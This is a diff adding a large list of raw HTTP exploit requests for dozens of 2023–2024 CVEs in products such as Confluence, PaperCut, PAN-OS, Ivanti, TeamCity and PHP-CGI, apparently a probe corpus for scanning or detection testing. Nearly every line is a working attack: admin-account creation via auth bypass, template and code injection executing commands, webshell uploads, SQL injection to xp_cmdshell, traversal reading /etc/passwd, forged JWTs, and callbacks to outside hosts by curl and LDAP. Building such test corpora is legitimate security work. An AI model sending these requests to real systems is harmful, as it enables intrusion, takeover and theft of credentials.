+GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
+GET /setup/setupadministrator-start.action
+POST /setup/setupadministrator.action header="X-Atlassian-Token: no-check" header="Content-Type: application/x-www-form-urlencoded" body="username=kunato&fullName=admin&email=kunato%40example.com&password=Kunato123%21&confirm=Kunato123%21&setup-next-button=Next"
+
+# --- CVE-2023-22518 (Confluence Data Center / Server): improper authorization
+#     on the setup-restore endpoint permits unauthenticated import (KEV) ---
+POST /json/setup-restore.action header="X-Atlassian-Token: no-check" header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7" bodyhex=2d2d2d2d2d2d5765624b6974466f726d426f756e64617279543379656b766f307247614c395152370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d226275696c64496e646578220d0a0d0a66616c73650d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279543379656b766f307247614c395152370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226b756e61746f2e7a6970220d0a0d0a6b756e61746f0d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279543379656b766f307247614c395152370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2265646974220d0a0d0a55706c6f616420616e6420696d706f72740d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279543379656b766f307247614c395152372d2d0d0a
+
+# --- CVE-2023-22527 (Confluence Data Center / Server): OGNL template injection
+#     in text-inline.vm leads to unauthenticated RCE (KEV) ---
+POST /template/aui/text-inline.vm header="Content-Type: application/x-www-form-urlencoded" body="label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc[0],{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\\u0027x_vuln_check\\u0027,(new+freemarker.template.utility.Execute()).exec({\\\"whoami\\\"}))"
+
+# --- CVE-2023-49070 / CVE-2023-51467 (Apache OFBiz): pre-auth XML-RPC Java
+#     deserialization and the requirePasswordChange auth bypass that reaches
+#     ProgramExport Groovy execution (KEV) ---
+POST /webtools/control/xmlrpc;/?USERNAME&PASSWORD=s&requirePasswordChange=Y header="Content-Type: application/xml" body="<methodCall><methodName>test</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAB</serializable></value></member></struct></value></param></params></methodCall>"
+POST /webtools/control/ProgramExport;/?USERNAME=&PASSWORD=&requirePasswordChange=Y header="Content-Type: application/x-www-form-urlencoded" body="groovyProgram=throw+new+Exception('id'.execute().text);"
+
+# --- CVE-2023-49103 (ownCloud graphapi): GetPhpInfo.php exposes the container
+#     environment, including admin credentials (KEV) ---
+GET /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php
+GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php
+GET /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/1.css
+
+# --- CVE-2023-27350 / CVE-2023-27351 (PaperCut NG / MF): unauthenticated
+#     SetupCompleted access, config-editor print-script RCE, and the
+#     SecurityRequestFilter bypass on the RPC API (KEV) ---
+GET /app?service=page/SetupCompleted
+POST /app header="Origin: http://127.0.0.1:8080" header="Content-Type: application/x-www-form-urlencoded" body="service=direct%2F1%2FSetupCompleted%2F%24Form&sp=S0&Form0=%24Hidden%2CanalyticsEnabled%2C%24Submit&%24Hidden=true&%24Submit=Login"
+POST /app header="Origin: http://127.0.0.1:8080" header="Content-Type: application/x-www-form-urlencoded" body="service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField=print-and-device.script.enabled&doQuickFind=Go"
+POST /app header="Origin: http://127.0.0.1:8080" header="Content-Type: application/x-www-form-urlencoded" body="service=direct%2F1%2FPrinterDetails%2F%24PrinterDetailsScript.%24Form&sp=S0&Form0=printerId%2CenablePrintScript%2CscriptBody%2C%24Submit%2C%24Submit%240%2C%24Submit%241&printerId=1&enablePrintScript=on&scriptBody=function+printJobHook%28inputs%2C+actions%29+%7B%7D%0D%0Ajava.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29%3B&%24Submit%241=Apply"
+POST /rpc/api/rest/master/user/createInternalUser;/keepalive header="Content-Type: application/json" body="{\"username\":[\"kunato\"],\"password\":[\"kunatopass\"]}"
+POST /rpc/api/rest/master/user/getExportedUser;/keepalive header="Content-Type: application/json" body="{\"username\":[\"kunato\"]}"
+
+# --- CVE-2023-24489 (Citrix ShareFile StorageZones Controller):
+#     unauthenticated upload.aspx path traversal writes a webshell (KEV) ---
+POST /documentum/upload.aspx?parentid=1&raw=1&unzip=on&uploadid=kunato%5c..%5c..%5c..%5ccifs&filename=kunato.aspx header="Content-Type: application/octet-stream" body="<%@ Page Language=\"C#\" %><script Language=\"c#\" runat=\"server\">void Page_Load(object sender, EventArgs e){Response.Write(\"pwned\");}</script>"
+GET /cifs/kunato.aspx
+
+# --- CVE-2023-0669 (Fortra GoAnywhere MFT): pre-auth Java deserialization in
+#     the license response servlet. The document PoC body is an AES-CBC
+#     encrypted Java gadget generated at runtime, so only the endpoint and
+#     parameter shape is carried here. ---
+POST /goanywhere/lic/accept header="Content-Type: application/x-www-form-urlencoded" body="bundle="
+
+# --- CVE-2023-26360 / CVE-2023-29300 (Adobe ColdFusion): WDDX and CFClient
+#     deserialization of untrusted data (KEV). CVE-2023-38203 / CVE-2023-38204
+#     are patch bypasses of the same WDDX vector. ---
+POST /CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx header="Content-Type: application/x-www-form-urlencoded" body="_variables={\"about\":{\"_metadata\":{\"classname\":\"../../../../../../../../../../../etc/passwd\"},\"_variables\":{}}}"
+POST ///CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true header="Content-Type: application/x-www-form-urlencoded" body="argumentCollection=<wddxPacket+version%3d'1.0'><header/><data><struct+type%3d'xcom.sun.rowset.JdbcRowSetImplx'><var+name%3d'dataSourceName'><string>ldap%3a//evil.example/rz</string></var><var+name%3d'autoCommit'><boolean+value%3d'true'/></var></struct></data></wddxPacket>"
+
+# --- CVE-2023-36846 / CVE-2023-36845 (Juniper J-Web): unauthenticated file
+#     upload through webauth_operation.php (do_upload) plus PHPRC environment
+#     injection that executes the uploaded PHP file (KEV chain) ---
+POST /webauth_operation.php header="Content-Type: application/x-www-form-urlencoded" body="rs=do_upload&rsargs[]=[{\"fileName\": \"test.php\", \"fileData\": \",PD9waHAgDQpwaHBpbmZvKCk7DQo/Pg==\", \"csize\": 22}]"
+POST /?PHPRC=/dev/fd/0 header="Content-Type: application/x-www-form-urlencoded" body="auto_prepend_file=\"/etc/passwd\""
+POST /webauth_operation.php header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryngts3YOfQfRAEypQ" bodyhex=2d2d2d2d2d2d5765624b6974466f726d426f756e646172796e67747333594f6651665241457970510d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d225048505243220d0a0d0a2f746d702f6b756e61746f2e696e690d0a2d2d2d2d2d2d5765624b6974466f726d426f756e646172796e67747333594f6651665241457970512d2d0d0a
+
+# --- CVE-2023-25690 (Apache httpd mod_proxy): request splitting through a
+#     RewriteRule that re-inserts user data into the proxied request-target ---
+GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED
+GET /here/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/admin%20HTTP/1.1
+
+# --- CVE-2023-29357 (Microsoft SharePoint): forged alg=none JWT accepted via
+#     the X-PROOF_TOKEN header, impersonating site admins (KEV) ---
+GET /_api/web/currentuser header="Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJhdWQiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwQGV4YW1wbGUuY29tIiwgImlzcyI6ICIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAiLCAibmJmIjogMTcwMDAwMDAwMCwgImV4cCI6IDQxMDI0NDQ4MDAsICJ2ZXIiOiAiaGFzaGVkcHJvb2Z0b2tlbiIsICJuYW1laWQiOiAiUy0xLTUtMjEtMDAwMDAwMDAwMCIsICJlbmRwb2ludHVybExlbmd0aCI6IDEsICJpc2xvb3BiYWNrIjogdHJ1ZX0.AAA" header="X-PROOF_TOKEN: eyJhbGciOiAibm9uZSJ9.eyJhdWQiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwQGV4YW1wbGUuY29tIiwgImlzcyI6ICIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAiLCAibmJmIjogMTcwMDAwMDAwMCwgImV4cCI6IDQxMDI0NDQ4MDAsICJ2ZXIiOiAiaGFzaGVkcHJvb2Z0b2tlbiIsICJuYW1laWQiOiAiUy0xLTUtMjEtMDAwMDAwMDAwMCIsICJlbmRwb2ludHVybExlbmd0aCI6IDEsICJpc2xvb3BiYWNrIjogdHJ1ZX0.AAA"
+GET /_api/web/siteusers header="Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJhdWQiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwQGV4YW1wbGUuY29tIiwgImlzcyI6ICIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAiLCAibmJmIjogMTcwMDAwMDAwMCwgImV4cCI6IDQxMDI0NDQ4MDAsICJ2ZXIiOiAiaGFzaGVkcHJvb2Z0b2tlbiIsICJuYW1laWQiOiAiUy0xLTUtMjEtMDAwMDAwMDAwMCIsICJlbmRwb2ludHVybExlbmd0aCI6IDEsICJpc2xvb3BiYWNrIjogdHJ1ZX0.AAA" header="X-PROOF_TOKEN: eyJhbGciOiAibm9uZSJ9.eyJhdWQiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwQGV4YW1wbGUuY29tIiwgImlzcyI6ICIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAiLCAibmJmIjogMTcwMDAwMDAwMCwgImV4cCI6IDQxMDI0NDQ4MDAsICJ2ZXIiOiAiaGFzaGVkcHJvb2Z0b2tlbiIsICJuYW1laWQiOiAiUy0xLTUtMjEtMDAwMDAwMDAwMCIsICJlbmRwb2ludHVybExlbmd0aCI6IDEsICJpc2xvb3BiYWNrIjogdHJ1ZX0.AAA"
+
+# --- CVE-2023-26035 (ZoneMinder): unauthenticated snapshot action creates a
+#     monitor whose Id reaches shell_exec ---
+POST /zm/index.php header="Content-Type: application/x-www-form-urlencoded" body="view=snapshot&action=create&monitor_ids[0][Id]=;id&__csrf_magic=key:0000000000000000000000000000000000000000,1"
+
+# --- CVE-2023-32315 (Ignite Realtime Openfire): path traversal in the setup
+#     environment reaches the admin console (KEV) ---
+GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
+
+# --- CVE-2023-48788 (Fortinet FortiClient EMS): unauthenticated SQL injection
+#     in the FCTUID of the registration message (KEV). The real message is
+#     sent to the EMS registration port with the SQLi inside FCTUID; the probe
+#     replays that field as an HTTP-shaped request. ---
+POST / header="X-FCCK-REGISTER: SYSINFO||" header="Content-Type: application/octet-stream" body="MSG_HEADER: FCTUID=CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1 --"
+POST / header="X-FCCK-REGISTER-END: 1" body="FCTUID=1' UNION SELECT NULL--"
+
+# --- CVE-2023-27997 (FortiGate SSL-VPN, "XORtigate"): pre-auth heap overflow
+#     through the enc parameter of /remote/hostcheck_validate (KEV). The
+#     public PoC sends ~63 KiB of data after the 00bfbfbf marker; the probe
+#     carries the endpoint and parameter prefix within the line limit. ---
+POST /remote/hostcheck_validate header="Content-Type: application/x-www-form-urlencoded" body="ajax=1&username=test&realm=&enc=00bfbfbfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+# --- CVE-2023-6553 (WordPress Backup Migration plugin): unauthenticated
+#     remote code execution through the Content-Dir header (KEV) ---
+POST /wp-content/plugins/backup-backup/includes/backup-heart.php header="Content-Dir: kunato"
+
+# --- CVE-2023-34468 (Apache NiFi): an authenticated user can point a DBCP or
+#     HikariCP controller service at an H2 JDBC URL that runs code (public
+#     PoC; CVE-2023-40037 is the follow-up bypass) ---
+PUT /nifi-api/controller-services/1 header="Content-Type: application/json" body="{\"disconnectedNodeAcknowledged\":false,\"component\":{\"id\":\"1\",\"name\":\"kunato\",\"properties\":{\"Database Connection URL\":\"jdbc:h2:file:/tmp/kunato.db;TRACE_LEVEL_SYSTEM_OUT=0\\\\;CREATE TRIGGER KUNATO BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('id')\\n$$\",\"Database Driver Class Name\":\"org.h2.Driver\"}},\"revision\":{\"clientId\":\"x\",\"version\":0}}"
+
+# --- CVE-2023-4220 (Chamilo LMS bigUpload): unauthenticated PHP upload
+#     through bigUpload.php lands in a web-readable directory ---
+POST /main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKunatoChamilo" bodyhex=2d2d2d2d2d2d5765624b6974466f726d426f756e646172794b756e61746f4368616d696c6f0d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2262696755706c6f616446696c65223b2066696c656e616d653d226b756e61746f2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0d0a2d2d2d2d2d2d5765624b6974466f726d426f756e646172794b756e61746f4368616d696c6f2d2d0d0a
+GET /main/inc/lib/javascript/bigupload/files/kunato.php?c=id
+
+# --- 2023 attack classes left out ---
+# CVE-2023-2868 (Barracuda ESG): the command injection arrives inside a .tar
+#   email attachment processed by the appliance, not in an HTTP request.
+# CVE-2023-20269 (Cisco ASA/FTD): CVSS 5.0 and the exploit is a VPN
+#   connection-profile brute force, not a single HTTP request.
+# CVE-2023-37580 (Zimbra): CVSS 6.1 XSS below the score threshold.
+# CVE-2023-38041 (Ivanti Secure Access Client): local (AV:L) TOCTOU.
+# CVE-2023-33157 (SharePoint): authenticated RCE with no public request shape.
+# CVE-2023-46748 (F5 BIG-IP) and CVE-2023-35081 (Ivanti EPMM): authenticated
+#   SQLi/file-write; no public single-request PoC found in this pass.
+# CVE-2023-46589 / CVE-2023-45648 / CVE-2023-42795 / CVE-2023-34981 /
+#   CVE-2023-41080 (Tomcat): the trailer smuggling needs a trailer header over
+#   the 8 KiB default limit, and the others are below 7.0 or response-driven.
+# CVE-2023-27522 (httpd mod_proxy_uwsgi): triggered by a malicious upstream
+#   response, not by the client request.
+# CVE-2023-44487 / CVE-2023-43622 / CVE-2023-45802 (HTTP/2): rapid reset and
+#   mod_http2 DoS need connection-level frame control (RST_STREAM, stalled
+#   window updates) that a request line cannot express.
+# CVE-2023-46604 (ActiveMQ OpenWire), CVE-2023-37582 / CVE-2023-33246
+#   (RocketMQ remoting), CVE-2023-25194 (Kafka SASL/JNDI): binary, non-HTTP
+#   protocols.
+# CVE-2023-32784 (KeePass): local process memory. CVE-2023-38545 (curl): the
+#   vulnerability is in the client. CVE-2023-36884 (Office/Windows HTML) and
+#   CVE-2023-23397 (Outlook): client-side or email-triggered.
+# CVE-2023-27992 (Zyxel NAS326/540/542, KEV): pre-auth command injection, but
+#   no public request-shape PoC was found in this pass.
+# CVE-2023-24078 (FuguHub): authenticated RCE; the public repository ships a
+#   report only, with no reproducible request.
+
+# ---------------------------------------------------------------------------
+# 2024 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# request line (binary bodies, connection-level framing) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2024-3400 (PAN-OS GlobalProtect): unauthenticated OS command injection
+#     through the SESSID cookie path and hipreport.esp parameters. ---
+POST /ssl-vpn/hipreport.esp header="Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt;" body="user=global&portal=global&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=global&computer=global&client-ip=global&client-ipv6=global&md5-sum=global&gwHipReportCheck=global"
+POST /ssl-vpn/hipreport.esp header="Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/poc`id`;" body="user=global&portal=global&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=global&computer=global&client-ip=global&client-ipv6=global&md5-sum=global&gwHipReportCheck=global"
+GET /global-protect/portal/images/poc.txt
+
+# --- CVE-2024-21887 / CVE-2024-21893 (Ivanti Connect Secure): command
+#     injection chained behind the CVE-2023-46805 path traversal, and SAML
+#     SSRF through ds:RetrievalMethod. ---
+GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20http://198.51.100.7/cve
+POST /dana-ws/saml20.ws header="Content-Type: text/xml" body="<?xml version=\"1.0\" encoding=\"UTF-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/></ds:SignedInfo><ds:SignatureValue>qwerty</ds:SignatureValue><ds:KeyInfo><ds:RetrievalMethod URI=\"http://198.51.100.7/x\"/><ds:X509Data/></ds:KeyInfo></ds:Signature></soap:Body></soap:Envelope>"
+
+# --- CVE-2024-1709 / CVE-2024-1708 (ConnectWise ScreenConnect):
+#     auth bypass via the SetupWizard alternate path and file read/write
+#     through traversal on the wizard path. ---
+GET /SetupWizard.aspx/
+GET /SetupWizard.aspx/poc
+POST /SetupWizard.aspx body="Username=poc&Password=poc&PasswordConfirm=poc"
+GET /SetupWizard.aspx/%2e%2e/%2e%2e/Administration
+
+# --- CVE-2024-27198 / CVE-2024-27199 (JetBrains TeamCity): jsp= parameter
+#     auth bypass, admin user/token creation, and /res/ path traversal. ---
+GET /hax?jsp=/app/rest/server;.jsp
+POST /hax?jsp=/app/rest/users;.jsp header="Content-Type: application/json" body="{\"username\":\"poc\",\"password\":\"poc\",\"email\":\"poc\",\"roles\":{\"role\":[{\"roleId\":\"SYSTEM_ADMIN\",\"scope\":\"g\"}]}}"
+GET /hax?jsp=/app/rest/users/id:1/tokens/poc;.jsp
+GET /res/../admin/diagnostic.jsp
+GET /.well-known/acme-challenge/../../admin/diagnostic.jsp
+
+# --- CVE-2024-4577 (PHP CGI on Windows): argument injection through the
+#     soft-hyphen query string prefix. ---
+POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input header="Content-Type: application/x-www-form-urlencoded" body="<?php system('id'); ?>"
+POST /php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input body="<?php system('id'); die; ?>"
+
+# --- CVE-2024-23897 (Jenkins): args4j '@file' expansion through the HTTP CLI
+#     endpoint. The upload body is an args4j stream; connect-node is asked to
+#     read /etc/passwd. ---
+POST /cli?remoting=false header="Session: 3f2504e0-4f89-11d3-9a0c-0305e82c3301" header="Side: download"
+POST /cli?remoting=false header="Session: 3f2504e0-4f89-11d3-9a0c-0305e82c3301" header="Side: upload" header="Content-Type: application/octet-stream" bodyhex=0000000e0000000c636f6e6e6563742d6e6f64650000000e0000000c402f6574632f706173737764000000070200055554462d3800000004010002656e00000002030000
+
+# --- CVE-2024-28995 (SolarWinds Serv-U): directory traversal in
+#     InternalDir/InternalFile. ---
+GET /?InternalDir=/../../../../windows&InternalFile=win.ini
+GET /?InternalDir=%5c..%5c..%5c..%5c..%5cetc&InternalFile=passwd
+
+# --- CVE-2024-3273 / CVE-2024-3272 (D-Link DNS-320/325/327/340 NAS): hardcoded
+#     account and base64 command injection through nas_sharing.cgi, plus
+#     CVE-2024-10914 account_mgr.cgi cgi_user_add injection. ---
+GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=
+GET /cgi-bin/nas_sharing.cgi?user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&cmd=15&system=aWQ=
+GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27
+
+# --- CVE-2024-51567 / CVE-2024-51568 (CyberPanel): pre-auth command injection
+#     via PUT on dataBases/upgrademysqlstatus and the filemanager upload
+#     completePath argument. ---
+PUT /dataBases/upgrademysqlstatus header="Content-Type: application/json" header="X-CSRFToken: poc" body="{\"statusfile\":\"/dev/null; id; #\",\"csrftoken\":\"poc\"}"
+POST /filemanager/upload header="Content-Type: multipart/form-data; boundary=poc" body="Content-Disposition: form-data; name=\"completePath\"; filename=\"poc\"; completePath=/home/example; id;"
+
+# --- CVE-2024-50623 / CVE-2024-55956 (Cleo Harmony/VLTrader/LexiCom):
+#     arbitrary file read and write through the VLSync header commands on the
+#     /Synchronization endpoint (fixed incorrectly for 50623). ---
+GET /Synchronization header="VLSync: Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=5.8.0.21;a=198.51.100.7;po=5080;s=True;b=False;pp=myEncryptedPassphrase;path=..\\..\\..\\windows\\win.ini"
+POST /Synchronization header="VLSync: ADD;l=Ab1234-RQ0258;n=VLTrader;v=5.8.0.21;a=198.51.100.7;po=5080;s=True;b=False;pp=myEncryptedPassphrase;path=..\\..\\..\\tmp\\poc.txt" body="poc"
+
+# --- CVE-2024-32113 / CVE-2024-36104 / CVE-2024-38856 / CVE-2024-45195 /
+#     CVE-2024-45507 (Apache OFBiz): path traversal to ProgramExport,
+#     unauthenticated screen rendering, xmldsdump file write, and remote
+#     screen-definition loading. ---
+POST /webtools/control/main/ProgramExport header="Content-Type: application/x-www-form-urlencoded" body="groovyProgram=throw new Exception('id'.execute().text);"
+POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport header="Content-Type: application/x-www-form-urlencoded" body="groovyProgram=throw new Exception('id'.execute().text);"
+POST /webtools/control/forgotPassword/xmldsdump header="Content-Type: application/x-www-form-urlencoded" body="outpath=./themes/common-theme/webapp/common-theme/&maxrecords=&filename=poc.txt&entityName=UserLogin"
+POST /webtools/control/view/StatsSinceStart header="Content-Type: application/x-www-form-urlencoded" body="statsDecoratorLocation=http%3a//198.51.100.7/x"
+
+# --- CVE-2024-27348 (Apache HugeGraph Server): Gremlin sandbox escape to
+#     ProcessBuilder execution. ---
+POST /gremlin header="Content-Type: application/json" body="{\"gremlin\":\"Thread thread = Thread.currentThread();Class clz = Class.forName(\\\"java.lang.Thread\\\");java.lang.reflect.Field field = clz.getDeclaredField(\\\"name\\\");field.setAccessible(true);field.set(thread, \\\"SL7\\\");Class processBuilderClass = Class.forName(\\\"java.lang.ProcessBuilder\\\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\\\"id\\\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\\\"start\\\");startMethod.invoke(processBuilderInstance);\",\"bindings\":{},\"language\":\"gremlin-groovy\",\"aliases\":{}}"
+
+# --- CVE-2024-28255 (OpenMetadata): JWT filter bypass with a path parameter
+#     and SpEL injection in the condition endpoint. ---
+GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/111
+GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22aWQ=%22)))
+
+# --- CVE-2024-37084 (Spring Cloud Data Flow / Skipper): malicious package
+#     upload whose package.yaml triggers SnakeYAML deserialization. The YAML
+#     payload travels inside the uploaded zip bytes, so the probe carries the
+#     packageFileAsBytes request shape. ---
+POST /api/package/upload header="Content-Type: application/json" body="{\"repoName\":\"local\",\"name\":\"thePoc\",\"version\":\"4.0.0\",\"extension\":\"zip\",\"packageFileAsBytes\":[80,75,3,4]}"
+
+# --- CVE-2024-4040 (CrushFTP): VFS sandbox escape through the zip command
+#     path traversal. ---
+GET /WebInterface/function/?command=zip&c2f=poc&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=/bbb
+POST /WebInterface/function/ body="command=login&username=poc&password=poc&encoded=true&language=en&random=0.5"
+
+# --- CVE-2024-4879 / CVE-2024-5217 / CVE-2024-5178 (ServiceNow): Jelly
+#     template injection through jvar_page_title and the co..nf filesystem
+#     filter bypass. ---
+GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj%3Ajelly%20xmlns%3Aj%3D%22jelly%3Acore%22%20xmlns%3Ag%3D%27glide%27%3E%3Cg%3Aevaluate%3Egs.addErrorMessage(1337*1337)%3B%3C%2Fg%3Aevaluate%3E%3C%2Fj%3Ajelly%3E%3C%2Fstyle%3E
+GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj%3Ajelly%20xmlns%3Aj%3D%22jelly%3Acore%22%20xmlns%3Ag%3D%27glide%27%3E%3Cg%3Aevaluate%3Ez%3Dnew%20Packages.java.io.File(%22%22).getAbsolutePath()%3Bu%3Dnew%20SecurelyAccess(z.concat(%22%2Fco..nf%2Fglide.db.properties%22)).getBufferedReader()%3B%3C%2Fg%3Aevaluate%3E%3C%2Fj%3Ajelly%3E%3C%2Fstyle%3E
+
+# --- CVE-2024-20767 (Adobe ColdFusion): unauthenticated access-control bypass
+#     for the servermanager heartbeat and the pms log file read. ---
+GET /hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat
+GET /hax/../pms?module=logging&file_name=../../../../../../../../etc/passwd&number_of_lines=1000 header="uuid: 00000000-0000-0000-0000-000000000000"
+
+# --- CVE-2024-29824 (Ivanti EPM): SQL injection to xp_cmdshell through the
+#     UpdateStatusEvents SOAP action (CVE-2024-29847 needs .NET remoting
+#     binary framing and is not expressible). ---
+POST /WSStatusEvents/EventHandler.asmx header="Content-Type: application/soap+xml" body="<soap12:Envelope xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\"><soap12:Body><UpdateStatusEvents xmlns=\"http://tempuri.org/\"><deviceID>x</deviceID><actions><Action name=\"x\" code=\"0\" date=\"0\" type=\"96\" user=\"x\" configguid=\"x\" location=\"x\"><status>GoodApp=1|md5='; EXEC xp_cmdshell 'whoami';--</status></Action></actions></UpdateStatusEvents></soap12:Body></soap12:Envelope>"
+
+# --- CVE-2024-7593 / CVE-2024-8963 / CVE-2024-8190 / CVE-2024-9380
+#     (Ivanti vTM and Cloud Services Appliance): admin creation before
+#     authentication, index.php path traversal, and command injection in
+#     TIMEZONE / TW_ID. ---
+POST /apps/zxtm/wizard.fcgi?error=1&section=Access+Management%3ALocalUsers body="_form_submitted=form&create_user=Create&group=admin&newusername=poc&password1=poc&password2=poc"
+GET /client/index.php%3F.php/gsb/users.php
+POST /gsb/DateTimeTab.php header="Content-Type: application/x-www-form-urlencoded" body="TIMEZONE=GMT;id;&save=Save"
+POST /gsb/reports.php header="Content-Type: application/x-www-form-urlencoded" body="TW_ID=;id;&submit=Submit"
+
+# --- CVE-2024-57726 / CVE-2024-57727 / CVE-2024-57728 (SimpleHelp):
+#     unauthenticated path traversal on the toolbox-resource endpoint. ---
+GET /toolbox-resource/../randomStr/../../configuration/serverconfig.xml
+GET /toolbox-resource/../x/../../../../configuration/serverconfig.xml
+
+# --- CVE-2024-53677 (Apache Struts S2-067): file upload parameter traversal
+#     through the top.UploadFileName multipart parameter. ---
+POST /upload.action body="Content-Disposition: form-data; name=\"top.UploadFileName\"; filename=\"../poc.jsp\""
+POST /upload.action body="top.UploadFileName=../poc.jsp"
+
+# --- CVE-2024-50379 / CVE-2024-56337 (Apache Tomcat): case-confusion JSP
+#     write through the write-enabled default servlet (race with a concurrent
+#     read on case-insensitive filesystems). ---
+PUT /aa.Jsp header="Content-Type: application/json" body="<% Runtime.getRuntime().exec(\"id\"); %>"
+PUT /bb.Jsp header="Content-Type: application/json" body="<% out.println(1337*1337); %>"
+GET /aa.jsp
+GET /bb.jsp
+
+# --- Apache httpd 2.4.59/2.4.60 filename-confusion family:
+#     CVE-2024-38473 (mod_proxy encoding ACL bypass) and CVE-2024-38475
+#     (mod_rewrite substitution mapping to files outside the docroot). ---
